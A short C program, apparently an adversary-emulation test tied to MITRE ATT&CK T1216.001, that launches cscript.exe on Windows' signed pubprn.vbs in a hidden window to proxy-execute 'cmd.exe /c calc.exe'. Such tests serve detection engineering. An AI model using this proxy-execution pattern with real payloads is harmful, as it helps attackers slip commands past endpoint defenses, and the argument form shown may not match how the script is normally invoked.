// Link      = https://attack.mitre.org/techniques/T1216/001/
// Technique = System Script Proxy Execution: PubPrn
// ID        = T1216.001
// Tactics   = Defense Evasion

#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)to_run, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

STARTUPINFOA si;
PROCESS_INFORMATION pi;

int main() {
    RUN("cscript.exe C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script \"cmd.exe /c calc.exe\"");

    return 0;
}
